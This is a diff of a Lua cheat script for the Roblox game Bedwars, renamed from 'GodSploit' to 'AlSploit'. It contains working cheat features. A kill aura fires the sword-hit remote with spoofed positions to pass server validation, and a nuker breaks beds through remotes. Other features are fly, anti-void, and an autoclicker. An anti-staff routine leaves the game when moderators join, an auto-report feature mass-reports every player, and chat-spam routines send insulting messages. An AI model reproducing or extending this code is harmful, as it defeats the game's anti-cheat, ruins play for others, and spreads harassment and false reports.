@@ -1,4 +1,4 @@
-local Owner = "AlSploitSuperCharged"
+local Owner = "342v624623463"
 
 local LocalPlayer = game.Players.LocalPlayer
 
@@ -13,7 +13,7 @@ local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local WorkSpace = game:GetService("Workspace") or game.Workspace
 
-local GodSploit = Instance.new("ScreenGui")
+local AlSploit = Instance.new("ScreenGui")
 local ContainerFrame = Instance.new("Frame")
 local ContainerFrameUIListLayout = Instance.new("UIListLayout")
 local NotificationContainer = Instance.new("Frame")
@@ -27,13 +27,13 @@ local Blur = Instance.new("BlurEffect")
 local DefaultLayoutOrder = 0
 
 task.spawn(function()
-	GodSploit.Name = "GodSploit"
-	GodSploit.Parent = LocalPlayer:WaitForChild("PlayerGui")
-	GodSploit.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	GodSploit.ResetOnSpawn = false
+	AlSploit.Name = "AlSploit"
+	AlSploit.Parent = LocalPlayer:WaitForChild("PlayerGui")
+	AlSploit.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	AlSploit.ResetOnSpawn = false
 
 	ContainerFrame.Name = "ContainerFrame"
-	ContainerFrame.Parent = GodSploit
+	ContainerFrame.Parent = AlSploit
 	ContainerFrame.BackgroundColor3 = Color3.new(1, 1, 1)
 	ContainerFrame.BackgroundTransparency = 1.000
 	ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
@@ -49,7 +49,7 @@ task.spawn(function()
 	ContainerFrameUIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
 	NotificationContainer.Name = "NotificationContainer"
-	NotificationContainer.Parent = GodSploit
+	NotificationContainer.Parent = AlSploit
 	NotificationContainer.BackgroundColor3 = Color3.new(1, 1, 1)
 	NotificationContainer.BackgroundTransparency = 1.000
 	NotificationContainer.BorderColor3 = Color3.new(0, 0, 0)
@@ -66,10 +66,10 @@ task.spawn(function()
 	UIStroke.Parent = Open
 	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 	UIStroke.Thickness = 2
-	UIStroke.Color = Color3.new(1, 0.666667, 0)
+	UIStroke.Color = Color3.new(0.411765, 0.215686, 1)
 
 	Open.Name = "Open"
-	Open.Parent = GodSploit
+	Open.Parent = AlSploit
 	Open.BackgroundColor3 = Color3.new(1, 1, 1)
 	Open.BorderColor3 = Color3.new(0, 0, 0)
 	Open.BorderSizePixel = 0
@@ -153,7 +153,7 @@ local function CreateTab(Name)
 	Title.TextSize = 20
 	Title.TextWrapped = true
 
-	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 	UIGradient.Rotation = 90
 	UIGradient.Parent = Title
 
@@ -178,7 +178,7 @@ local function CreateToggle(Parent, Name, DefaultValue, CallBack)
 		task.spawn(function()
 			if Value == true then
 				CallBackValue = true
-				UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+				UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 
 				CallBack(true)
 			end
@@ -273,7 +273,7 @@ local function CreateKeyBind(Parent, DefaultValue, LayoutOrder, CallBack)
 	KeyBind.TextSize = 11
 	KeyBind.LayoutOrder = LayoutOrder
 
-	UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+	UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 	UIGradient.Rotation = 90
 	UIGradient.Parent = KeyBind
 
@@ -326,7 +326,7 @@ local function CreateMiniToggle(Parent, Name, DefaultValue, LayoutOrder, CallBac
 		task.spawn(function()
 			if Value == true then
 				CallBackValue = true
-				UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+				UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 
 				CallBack(true)
 			end
@@ -357,7 +357,7 @@ local function CreateMiniToggle(Parent, Name, DefaultValue, LayoutOrder, CallBac
 	MiniToggle.TextSize = 11
 	MiniToggle.LayoutOrder = LayoutOrder
 
-	UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+	UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 	UIGradient.Rotation = 90
 	UIGradient.Parent = MiniToggle
 
@@ -414,13 +414,13 @@ local function CreateSlider(Parent, Name, DefaultValue, MaximumValue, LayoutOrde
 	Fill.Position = UDim2.new(-0.00672, 0, -0.329, 0)
 	Fill.Size = UDim2.new(1.000, 0, 1, 0)
 
-	UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+	UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 	UIGradient.Rotation = 90
 	UIGradient.Parent = Fill
 
 	Bar.Name = "Bar"
 	Bar.Parent = SliderFrame
-	Bar.BackgroundColor3 = Color3.new(1, 0.666667, 0)
+	Bar.BackgroundColor3 = Color3.new(0.411765, 0.215686, 1)
 	Bar.BorderColor3 = Color3.new(0, 0, 0)
 	Bar.BorderSizePixel = 0
 	Bar.Position = UDim2.new(0.199, 0, -1.768, 0)
@@ -450,7 +450,7 @@ local function CreateSlider(Parent, Name, DefaultValue, MaximumValue, LayoutOrde
 	NameDisplay.Size = UDim2.new(0, 50, 0, 30)
 	NameDisplay.Font = Enum.Font.GothamBold
 	NameDisplay.Text = Name
-	NameDisplay.TextColor3 = Color3.new(1, 0.666667, 0)
+	NameDisplay.TextColor3 = Color3.new(0.411765, 0.215686, 1)
 	NameDisplay.TextScaled = true
 	NameDisplay.TextSize = 10
 
@@ -467,7 +467,7 @@ local function CreateSlider(Parent, Name, DefaultValue, MaximumValue, LayoutOrde
 	ValueDisplay.Size = UDim2.new(0, 50, 0, 30)
 	ValueDisplay.Font = Enum.Font.GothamBold
 	ValueDisplay.Text = DefaultValue
-	ValueDisplay.TextColor3 = Color3.new(1, 0.666667, 0)
+	ValueDisplay.TextColor3 = Color3.new(0.411765, 0.215686, 1)
 	ValueDisplay.TextScaled = true
 	ValueDisplay.TextSize = 10
 
@@ -567,7 +567,7 @@ local function CreateNotification(Duration, Message)
 	UIStroke.Thickness = 2
 	UIStroke.Color = Color3.new(1, 1, 1)
 
-	UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 0.666667, 0)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 0.803922, 0.411765))}
+	UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
 	UIGradient.Parent = UIStroke
 
 	UICorner.Parent = Notification
@@ -626,7 +626,7 @@ local function CreateFlyHud()
 	local UICorner_3 = Instance.new("UICorner")
 
 	Background.Name = "Background"
-	Background.Parent = GodSploit
+	Background.Parent = AlSploit
 	Background.BackgroundColor3 = Color3.new(0, 0, 0)
 	Background.BackgroundTransparency = 0.250
 	Background.BorderColor3 = Color3.new(0, 0, 0)
@@ -659,7 +659,7 @@ local function CreateFlyHud()
 	Text.Size = UDim2.new(1, 0, 0.489, 0)
 	Text.Font = Enum.Font.GothamBold
 	Text.Text = "1"
-	Text.TextColor3 = Color3.new(1, 0.666667, 0)
+	Text.TextColor3 = Color3.new(0.411765, 0.215686, 1)
 	Text.TextScaled = true
 	Text.TextSize = 20
 	Text.TextWrapped = true
@@ -680,7 +680,7 @@ local function CreateFlyHud()
 
 	Display.Name = "Display"
 	Display.Parent = DisplayBackground
-	Display.BackgroundColor3 = Color3.new(1, 0.666667, 0)
+	Display.BackgroundColor3 = Color3.new(0.411765, 0.215686, 1)
 	Display.BorderColor3 = Color3.new(0, 0, 0)
 	Display.BorderSizePixel = 0
 	Display.Position = UDim2.new(0, 0, 0, 0)
@@ -711,7 +711,7 @@ function CreateOutline(Player)
 		Frame.Parent = BillBoard
 
 		UIStroke.Thickness = 1.5
-		UIStroke.Color = Color3.new(1, 0.666667, 0)
+		UIStroke.Color = Color3.new(0.411765, 0.215686, 1)
 		UIStroke.Transparency = 0
 		UIStroke.Parent = Frame
 
@@ -723,7 +723,7 @@ end
 local Settings = {}
 local Loaded = false
 
-local SaveFileName = "GodSploitPrivateSaving.lua"
+local SaveFileName = "AlSploitRebornSaving.lua"
 
 local function CreateSettingsFile()
 	local DefaultSetting = {Properties = {Value = false}}
@@ -792,21 +792,21 @@ local function CreateSettingsFile()
 		end
 
 		if writefile and makefolder and readfile and isfile then 
-			makefolder("GodSploitBedwarsConfigSaving")
+			makefolder("AlSploitBedwarsConfigSaving")
 
 			local JSONEncodeSettings = HttpService:JSONEncode(Settings)
 
-			writefile("GodSploitBedwarsConfigSaving/" .. SaveFileName, JSONEncodeSettings)
+			writefile("AlSploitBedwarsConfigSaving/" .. SaveFileName, JSONEncodeSettings)
 		end
 	end)	
 end
 
 local function CheckFirstTime()
-	if isfile("GodSploitBedwarsConfigSaving/" .. SaveFileName) then
+	if isfile("AlSploitBedwarsConfigSaving/" .. SaveFileName) then
 		return false
 	end
 
-	if not isfile("GodSploitBedwarsConfigSaving/" .. SaveFileName) then
+	if not isfile("AlSploitBedwarsConfigSaving/" .. SaveFileName) then
 		return true
 	end
 end
@@ -814,12 +814,12 @@ end
 local function SaveSettings()	
 	local JSONEncodeSettings = HttpService:JSONEncode(Settings)
 
-	writefile("GodSploitBedwarsConfigSaving/" .. SaveFileName, JSONEncodeSettings)	
+	writefile("AlSploitBedwarsConfigSaving/" .. SaveFileName, JSONEncodeSettings)	
 end
 
 local function LoadSettings()
-	if isfile("GodSploitBedwarsConfigSaving/" .. SaveFileName) then
-		Settings = HttpService:JSONDecode(readfile("GodSploitBedwarsConfigSaving/" .. SaveFileName))
+	if isfile("AlSploitBedwarsConfigSaving/" .. SaveFileName) then
+		Settings = HttpService:JSONDecode(readfile("AlSploitBedwarsConfigSaving/" .. SaveFileName))
 
 		Loaded = true
 	end
@@ -1064,6 +1064,56 @@ function FindNearestPlayer(MaxDistance)
 	end
 
 	return NearestPlayer, NearestPlayerDistance
+end
+
+local function CreateAntiVoidPart()
+	repeat task.wait() until GetMatchState() ~= 0
+
+	local OldLowestPosition = math.huge
+	local LowestPosition = 99999
+
+	local BlockRaycastParameters = RaycastParams.new()
+
+	BlockRaycastParameters.FilterType = Enum.RaycastFilterType.Include
+	BlockRaycastParameters.FilterDescendantsInstances = CollectionService:GetTagged("block")
+
+	AntiVoidPart = Instance.new("Part")
+	AntiVoidPart.Parent = WorkSpace
+	AntiVoidPart.Material = Enum.Material.Neon
+	AntiVoidPart.Name = "AntiVoidPart"
+	AntiVoidPart.Size = Vector3.new(99999, 1, 99999)
+	AntiVoidPart.Position = Vector3.new(0, 99999, 0)
+	AntiVoidPart.Transparency = Settings.AntiVoid.Transparency
+	AntiVoidPart.Color = Color3.new(0.666667, 0, 1)
+	AntiVoidPart.CanCollide = false
+	AntiVoidPart.Anchored = true
+
+	task.spawn(function()
+		for i, v in next, CollectionService:GetTagged("block") do
+			local NewRay = WorkSpace:Raycast(v.Position + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), BlockRaycastParameters)
+
+			if NewRay then
+				LowestPosition = NewRay.Position.Y
+				if LowestPosition < OldLowestPosition then
+					OldLowestPosition = LowestPosition
+
+					AntiVoidPart.Position = Vector3.new(0, LowestPosition - 4, 0)
+				end
+			end					
+		end
+	end)
+
+	task.spawn(function()
+		AntiVoidPart.Touched:Connect(function()
+			if IsAlive(LocalPlayer) and AntiVoidPart and LocalPlayer.Character.PrimaryPart.Position.Y <= WorkSpace.AntiVoidPart.Position.Y then
+				for i = 1, 3 do
+					if IsAlive(LocalPlayer) then
+						LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, 100, LocalPlayer.Character.PrimaryPart.Velocity.Z)
+					end
+				end
+			end
+		end)
+	end)
 end
 
 local function FindNearestEntity(MaxDistance)
@@ -1389,14 +1439,14 @@ local function SetCollisions(Value)
 	end
 end
 
-local function GetMatchState()
+function GetMatchState()
 	if ClientHandlerStoreGotten then
 		return ClientHandlerStore:getState().Game.matchState
 	end
 
 	if not ClientHandlerStoreGotten then
 		return 1
-	end
+	end	
 end
 
 local function HashFunction(Value)
@@ -1588,27 +1638,27 @@ local function AutoToxic(Player)
 	local KillMessage = ""					
 
 	if Randomized == 0 then
-		KillMessage = "You are so bad u died. L" .. Player.Name .. " | GodSploit on top"
+		KillMessage = "You are so bad u died. L" .. Player.Name .. " | AlSploit on top"
 	end
 
 	if Randomized ~= 0 then
-		KillMessage = "I could probably win without cheats. L" .. Player.Name .. " | GodSploit on top"
+		KillMessage = "I could probably win without cheats. L" .. Player.Name .. " | AlSploit on top"
 	end
 
 	if Randomized == 2 then
-		KillMessage = "Clowns are the only ones we kill. L" .. Player.Name .. " | GodSploit on top"
+		KillMessage = "Clowns are the only ones we kill. L" .. Player.Name .. " | AlSploit on top"
 	end
 
 	if Randomized == 3 then
-		KillMessage = "Rats. Imagine dying in a block game. L" .. Player.Name .. " | GodSploit on top"
+		KillMessage = "Rats. Imagine dying in a block game. L" .. Player.Name .. " | AlSploit on top"
 	end
 
 	if Randomized == 4 then
-		KillMessage = "I hack for fun. Too bad your fun is ruined. L" .. Player.Name .. " | GodSploit on top"
+		KillMessage = "I hack for fun. Too bad your fun is ruined. L" .. Player.Name .. " | AlSploit on top"
 	end
 
 	if Randomized == 5 then
-		KillMessage = "I ruined a good day for a good reason. L" .. Player.Name .. " | GodSploit on top"
+		KillMessage = "I ruined a good day for a good reason. L" .. Player.Name .. " | AlSploit on top"
 	end
 
 	SendChatMessage(KillMessage)
@@ -1656,27 +1706,27 @@ local function ChatSpam()
 	local KillMessage = ""
 
 	if Randomized == 0 then
-		KillMessage = "GodSploit does more updates than Bedwars 💀. | GodSploit On Top"
+		KillMessage = "AlSploit does more updates than Bedwars 💀. | AlSploit On Top"
 	end
 
 	if Randomized ~= 0 then
-		KillMessage = "SkidB4 is as bad as how you felt when your dad left you. | GodSploit On Top"
+		KillMessage = "SkidB4 is as bad as how you felt when your dad left you. | AlSploit On Top"
 	end
 
 	if Randomized == 2 then
-		KillMessage = "Switch to GodSploit, ez wins. | GodSploit On Top"
+		KillMessage = "Switch to AlSploit, ez wins. | AlSploit On Top"
 	end
 
 	if Randomized == 3 then
-		KillMessage = "I am not cheating, my gaming chair is. | GodSploit On Top"
+		KillMessage = "I am not cheating, my gaming chair is. | AlSploit On Top"
 	end
 
 	if Randomized == 4 then
-		KillMessage = "3 years now, and the anticheat is still the same. | GodSploit On Top"
+		KillMessage = "3 years now, and the anticheat is still the same. | AlSploit On Top"
 	end
 
 	if Randomized == 5 then
-		KillMessage = "Kids in bedwars just keep getting worst. | GodSploit On Top"
+		KillMessage = "Kids in bedwars just keep getting worst. | AlSploit On Top"
 	end
 
 	SendChatMessage(KillMessage)
@@ -2182,14 +2232,59 @@ end
 local function SwordHit(Entity, Weapon, NearestEntityDistance)
 	local LocalPlayerHumanoidRootPart = LocalPlayer.Character.HumanoidRootPart
 	local EntityPrimaryPart = Entity.PrimaryPart
+	local LookVector = CFrame.lookAt(LocalPlayerHumanoidRootPart.Position, EntityPrimaryPart.Position).lookVector
 	local Magnitude = (LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude
 
-	local SelfPosition = LocalPlayerHumanoidRootPart.Position + (20 > 14 and Magnitude > 14.4 and (CFrame.lookAt(LocalPlayerHumanoidRootPart.Position, EntityPrimaryPart.Position).lookVector * (Magnitude - 14)) or Vector3.zero)
+	local SelfPosition
 
 	task.spawn(function()
-		LocalPlayer.Character.Head.CFrame = CFrame.lookAt(LocalPlayer.Character.Head.Position, EntityPrimaryPart.Position)
+		task.spawn(function()
+			if Settings.KillAura.ToolCheck == false then
+				task.spawn(function()
+					SwitchItem(Weapon.itemType)
+				end)
+
+				SelfPosition = LocalPlayerHumanoidRootPart.Position + LookVector * (Magnitude - 14)
+
+				SwordHitRemote:FireServer({
+					weapon = Weapon.tool,
+					chargedAttack = {chargeRatio = 0},
+					entityInstance = Entity,
+					validate = {
+						raycast = {
+							cameraPosition = HashFunction(LocalPlayerHumanoidRootPart.Position), 
+							cursorDirection = HashFunction(LookVector)
+						},
+						targetPosition = HashFunction(EntityPrimaryPart.Position),
+						selfPosition = HashFunction(SelfPosition)
+					}
+				})
+			end
+		end)		
+
+		task.spawn(function()
+			if Settings.KillAura.ToolCheck == true then
+				if HasItem(Weapon.itemType) then
+					SelfPosition = LocalPlayerHumanoidRootPart.Position + LookVector * (Magnitude - 14)
+
+					SwordHitRemote:FireServer({
+						weapon = Weapon.tool,
+						chargedAttack = {chargeRatio = 0},
+						entityInstance = Entity,
+						validate = {
+							raycast = {
+								cameraPosition = HashFunction(LocalPlayerHumanoidRootPart.Position), 
+								cursorDirection = HashFunction(LookVector)
+							},
+							targetPosition = HashFunction(EntityPrimaryPart.Position),
+							selfPosition = HashFunction(SelfPosition)
+						}
+					})
+				end
+			end
+		end)		
 	end)
-	
+
 	task.spawn(function()
 		if Settings.KillAura.CustomAnimation == true and KillAuraAnimationCooldown == false then
 			KillAuraAnimationCooldown = true
@@ -2205,7 +2300,7 @@ local function SwordHit(Entity, Weapon, NearestEntityDistance)
 			task.spawn(function()
 				if Settings.Strafe.GoBackwards == true then
 					local TweenInformation = TweenInfo.new((Magnitude / 22.5), Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
-					local StrafeTween = TweenService:Create(LocalPlayerHumanoidRootPart, TweenInformation, {CFrame = CFrame.new(EntityPrimaryPart.Position - (EntityPrimaryPart.CFrame.LookVector * 5))})
+					local StrafeTween = TweenService:Create(LocalPlayerHumanoidRootPart, TweenInformation, {CFrame = CFrame.new(EntityPrimaryPart.Position - (EntityPrimaryPart.CFrame.LookVector))})
 
 					StrafeTween:Play()
 				end	
@@ -2219,50 +2314,6 @@ local function SwordHit(Entity, Weapon, NearestEntityDistance)
 					StrafeTween:Play()
 				end	
 			end)			
-		end
-	end)
-
-	task.spawn(function()
-		if Settings.KillAura.ToolCheck == false then
-			task.spawn(function()
-				SwitchItem(Weapon.itemType)
-			end)
-
-			SelfPosition = LocalPlayerHumanoidRootPart.Position + (20 > 14 and (LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude > 14.4 and (CFrame.lookAt(LocalPlayerHumanoidRootPart.Position, EntityPrimaryPart.Position).lookVector * ((LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude - 14)) or Vector3.zero)
-
-			SwordHitRemote:FireServer({
-				weapon = Weapon.tool,
-				chargedAttack = {chargeRatio = 0},
-				entityInstance = Entity,
-				validate = {
-					raycast = {
-						cameraPosition = HashFunction(LocalPlayerHumanoidRootPart.Position), 
-						cursorDirection = HashFunction(CFrame.new(SelfPosition, EntityPrimaryPart.Position).lookVector)
-					},
-					targetPosition = HashFunction(EntityPrimaryPart.Position),
-					selfPosition = HashFunction(SelfPosition)
-				}
-			})
-		end
-
-		if Settings.KillAura.ToolCheck == true then
-			if HasItem(Weapon.itemType) then
-				SelfPosition = LocalPlayerHumanoidRootPart.Position + (20 > 14 and (LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude > 14.4 and (CFrame.lookAt(LocalPlayerHumanoidRootPart.Position, EntityPrimaryPart.Position).lookVector * ((LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude - 14)) or Vector3.zero)
-
-				SwordHitRemote:FireServer({
-					weapon = Weapon.tool,
-					chargedAttack = {chargeRatio = 0},
-					entityInstance = Entity,
-					validate = {
-						raycast = {
-							cameraPosition = HashFunction(LocalPlayerHumanoidRootPart.Position), 
-							cursorDirection = HashFunction(CFrame.new(SelfPosition, EntityPrimaryPart.Position).lookVector)
-						},
-						targetPosition = HashFunction(EntityPrimaryPart.Position),
-						selfPosition = HashFunction(SelfPosition)
-					}
-				})
-			end
 		end
 	end)
 end
@@ -2356,24 +2407,26 @@ local function Nuker(NearestBed, NearestOre)
 
 			local RaycastResult = WorkSpace:Raycast(NearestBed.Position + Vector3.new(0, 30, 0), Vector3.new(0, -35, 0), NukerRaycastParameters)
 
-			if RaycastResult then
-				if RaycastResult.Instance then
-					TargetBlock = RaycastResult.Instance
+			task.spawn(function()
+				if RaycastResult then
+					if RaycastResult.Instance then
+						TargetBlock = RaycastResult.Instance
+					end
+
+					if not RaycastResult.Instance then
+						TargetBlock = NearestBed
+					end				
+
+					DamageBlockRemote:InvokeServer({
+						blockRef = {
+							blockPosition = GetServerPosition(TargetBlock.Position)
+						},
+
+						hitPosition = GetServerPosition(TargetBlock.Position),
+						hitNormal = GetServerPosition(TargetBlock.Position)
+					})
 				end
-
-				if not RaycastResult.Instance then
-					TargetBlock = NearestBed
-				end				
-
-				DamageBlockRemote:InvokeServer({
-					blockRef = {
-						blockPosition = GetServerPosition(TargetBlock.Position)
-					},
-					
-					hitPosition = GetServerPosition(TargetBlock.Position),
-					hitNormal = GetServerPosition(TargetBlock.Position)
-				})
-			end
+			end)			
 
 			task.spawn(function()
 				local _, Value = Camera:WorldToScreenPoint(NearestBed.Position)
@@ -2390,7 +2443,7 @@ local function Nuker(NearestBed, NearestOre)
 					blockRef = {
 						blockPosition = GetServerPosition(NearestOre.Position)
 					},
-					
+
 					hitPosition = GetServerPosition(NearestOre.Position),
 					hitNormal = GetServerPosition(NearestOre.Position)
 				})
@@ -2459,7 +2512,7 @@ local function FlyMe()
 
 						if FlyRaycast and IsAlive(LocalPlayer) then 
 							local Args = {LocalPlayer.Character.PrimaryPart.CFrame:GetComponents()}
-							
+
 							Args[2] = FlyRaycast.Position.Y + 1 + LocalPlayer.Character.Humanoid.HipHeight
 
 							FlyTeleportPosition = LocalPlayer.Character.PrimaryPart.Position.Y
@@ -2471,7 +2524,7 @@ local function FlyMe()
 
 								if IsAlive(LocalPlayer) then 									
 									local Args = {LocalPlayer.Character.PrimaryPart.CFrame:GetComponents()}	
-									
+
 									Args[2] = FlyTeleportPosition
 
 									LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(unpack(Args))																		
@@ -2648,19 +2701,25 @@ task.spawn(function()
 		end)
 
 		task.spawn(function()
-			if Settings.Cape.Value == true and IsAlive(LocalPlayer) and IsMoving() and LocalPlayer.Character:FindFirstChild("Cape") and LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Motor") then
-				local TweenInformation = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
-				local CapeTween = TweenService:Create(LocalPlayer.Character.Cape.Motor, TweenInformation, {CurrentAngle = -0.6})
+			if IsAlive(LocalPlayer) and Settings.Cape.Value == true then
+				task.spawn(function()
+					if IsMoving() and LocalPlayer.Character:FindFirstChild("Cape") and LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Motor") then
+						local TweenInformation = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
+						local CapeTween = TweenService:Create(LocalPlayer.Character.Cape.Motor, TweenInformation, {CurrentAngle = -0.6})
 
-				CapeTween:Play()
-			end
+						CapeTween:Play()
+					end
+				end)
 
-			if Settings.Cape.Value == true and IsAlive(LocalPlayer) and not IsMoving() and LocalPlayer.Character:FindFirstChild("Cape") and LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Motor") then
-				local TweenInformation = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
-				local CapeTween = TweenService:Create(LocalPlayer.Character.Cape.Motor, TweenInformation, {CurrentAngle = -0.2})
+				task.spawn(function()
+					if not IsMoving() and LocalPlayer.Character:FindFirstChild("Cape") and LocalPlayer.Character:FindFirstChild("Cape"):FindFirstChild("Motor") then
+						local TweenInformation = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
+						local CapeTween = TweenService:Create(LocalPlayer.Character.Cape.Motor, TweenInformation, {CurrentAngle = -0.2})
 
-				CapeTween:Play()
-			end
+						CapeTween:Play()
+					end
+				end)				
+			end			
 		end)	
 	until not game
 end)
@@ -2714,30 +2773,36 @@ task.spawn(function()
 		task.wait()
 
 		if Settings.AutoClicker.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
-			if Settings.AutoClicker.ButterFlyClick == true then
-				Click()
+			task.spawn(function()
+				if Settings.AutoClicker.ButterFlyClick == true then
+					Click()
 
-				task.wait((1 / Settings.AutoClicker.Cps) / 4)
+					task.wait((1 / Settings.AutoClicker.Cps) / 4)
 
-				Click()
+					Click()
 
-				task.wait(1 / Settings.AutoClicker.Cps)
-			end		
+					task.wait(1 / Settings.AutoClicker.Cps)
+				end	
+			end)
 
-			if Settings.AutoClicker.JitterClick == true then
-				Click()
+			task.spawn(function()
+				if Settings.AutoClicker.JitterClick == true then
+					Click()
 
-				task.wait((1 / Settings.AutoClicker.Cps) / 2)
+					task.wait((1 / Settings.AutoClicker.Cps) / 2)
 
-				Click()			
+					Click()			
 
-				task.wait(1 / Settings.AutoClicker.Cps)
-			end	
+					task.wait(1 / Settings.AutoClicker.Cps)
+				end
+			end)
 
-			if Settings.AutoClicker.BlatantClick == true then
-				task.wait(1 / Settings.AutoClicker.Cps)
-				Click()
-			end	
+			task.spawn(function()
+				if Settings.AutoClicker.BlatantClick == true then
+					task.wait(1 / Settings.AutoClicker.Cps)
+					Click()
+				end
+			end)				
 		end	
 	until not game
 end)
@@ -2760,30 +2825,35 @@ task.spawn(function()
 	repeat
 		task.wait(1)
 
-		if Settings.AutoReport.Value == true then
-			for i, v in next, PlayerService:GetPlayers() do
-				if v ~= LocalPlayer and v:GetAttribute("PlayerConnected") and ReportedList[v] == nil then
-					ReportRemote:FireServer(v.UserId)
-					ReportedList[v] = true
+		task.spawn(function()
+			if Settings.AutoReport.Value == true then
+				for i, v in next, PlayerService:GetPlayers() do
+					if v ~= LocalPlayer and v:GetAttribute("PlayerConnected") and ReportedList[v] == nil then
+						ReportRemote:FireServer(v.UserId)
+						ReportedList[v] = true
+					end
 				end
-			end
-		end	
+			end	
+		end)		
 	until not game
 end)
 
 task.spawn(function()
-	PlayerService.PlayerAdded:Connect(function(Player)
-		if Player:IsInGroup(5774246) and Player:GetRankInGroup(5774246) >= 2 then
+	task.spawn(function()
+		PlayerService.PlayerAdded:Connect(function(Player)
+			if Player:IsInGroup(5774246) and Player:GetRankInGroup(5774246) >= 2 then
 
-			task.spawn(function()
-				if Settings.AntiStaff.Kick == true then
-					LocalPlayer:Kick("A staff has joined your game!")
-				end
+				task.spawn(function()
+					if Settings.AntiStaff.Kick == true then
+						LocalPlayer:Kick("A staff has joined your game, their name is " .. Player.Name .. "!")
+					end
 
-				CreateNotification(60,  "A staff has joined your game!")	
-			end)
-		end
+					CreateNotification(60,  "A staff has joined your game, their name is " .. Player.Name .. "!")	
+				end)
+			end
+		end)
 	end)
+
 
 	task.spawn(function()
 		task.wait(5)
@@ -2791,18 +2861,13 @@ task.spawn(function()
 		for i, v in next, PlayerService:GetPlayers() do
 			task.spawn(function()
 				if v:IsInGroup(5774246) and v:GetRankInGroup(5774246) >= 2 then
+					if Settings.AntiStaff.Kick == true then
+						LocalPlayer:Kick("A staff has joined your game, their name is " .. v.Name .. "!")
+					end
 
-					task.spawn(function()
-						task.spawn(function()
-							if Settings.AntiStaff.Kick == true then
-								LocalPlayer:Kick("A staff has joined your game!")
-							end
-						end)
-
-						CreateNotification(60,  "A staff has joined your game!")	
-					end)								
+					CreateNotification(60,  "A staff has joined your game, their name is " .. v.Name .. "!")									
 				end
-			end)			
+			end)
 		end
 	end)
 end)
@@ -2834,9 +2899,11 @@ task.spawn(function()
 
 	repeat task.wait(1) until GetMatchState() == 2
 
-	if Settings.PlayAgain.Value == true then
-		PlayAgainRemote.joinQueue:FireServer({["queueType"] = GetQueueType()})
-	end
+	task.spawn(function()
+		if Settings.PlayAgain.Value == true then
+			PlayAgainRemote.joinQueue:FireServer({["queueType"] = GetQueueType()})
+		end
+	end)	
 end)
 
 task.spawn(function()
@@ -2920,53 +2987,61 @@ end)
 task.spawn(function()
 	repeat task.wait() until GetMatchState() ~= 0
 
-	for i, v in next, PlayerService:GetPlayers() do
